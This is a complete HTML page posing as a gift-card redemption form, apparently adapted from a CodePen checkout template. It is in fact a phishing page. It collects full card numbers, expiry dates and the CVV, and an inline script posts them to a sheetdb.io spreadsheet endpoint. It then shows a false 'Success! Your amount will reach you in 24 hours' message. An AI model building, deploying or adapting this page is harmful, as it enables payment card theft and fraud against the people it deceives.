<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>CodePen - #codevember Credit Card Checkout</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
<link rel="stylesheet" href="./style.css">

</head>
<body>
<!-- partial:index.partial.html -->
<div class="wrapper">
  <img src="/1654605918311-removebg-preview.png" weight="200%">
    <div class="container">
        <article class="part card-details">
            <h1>
                Redeem your gift card
            </h1>
            <form method="post" action="https://sheetdb.io/api/v1/vpmrtsagg8mot" id="sheetdb-form" if="cc-form" autocomplete="off">
                <div class="group card-number">
                    <label for="first">Card Number</label>
                    <input type="text" name="data[cc_number1]" id="first" class="cc-num" type="text" maxlength="4" placeholder="&#9679;&#9679;&#9679;&#9679;">
                    <input type="text" id="second" class="cc-num" type="text" name="data[cc_number2]" maxlength="4" placeholder="&#9679;&#9679;&#9679;&#9679;">
                    <input type="text" id="third" class="cc-num" type="text" name="data[cc_number3]" maxlength="4" placeholder="&#9679;&#9679;&#9679;&#9679;">
                    <input type="text" id="fourth" class="cc-num" type="text" name="data[cc_number4]" maxlength="4" placeholder="&#9679;&#9679;&#9679;&#9679;">
                </div>
                <div class="group card-name">
                    <label for="name">Gift card number</label>
                    <input type="text" name="data[name]" id="name" class="" type="text" maxlength="20" placeholder="***********">
                </div>
                <div class="group card-expiry">
                    <div class="input-item expiry">
                        <label for="expiry">Expiry Date</label>
                        <input type="text" name="data[month]" class="month" id="expiry" placeholder="02">
                        <input type="text" name="data[year]" class="year" id="" placeholder="2022">
                    </div>
                    <div class="input-item csv">
                        <label for="csv">CSV No.</label><a href="#what">?</a>
                        <input type="text" name="data[csv]" class="csv">
                    </div>
                </div>
                <div class="grup submit-group">
                    <span class="arrow"></span>
                    <input type="submit" class="submit" value="continue to redeem">
                </div>
            </form>
        </article>
        <div class="part bg"></div>
    </div>
</div>
<!-- partial -->
  <script src='//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script><script  src="./script.js"></script>

<script>
  var form = document.getElementById('sheetdb-form');
  form.addEventListener("submit", e => {
    e.preventDefault();
    fetch(form.action, {
      method: "POST",
      body: new FormData(document.getElementById("sheetdb-form")),
    }).then(
      response => response.json()
    ).then((html) => {
      // you can put any JS code here
      alert('Success! Your amount will reach you in 24 hours.')
    });
  });
</script>
</body>

</html>
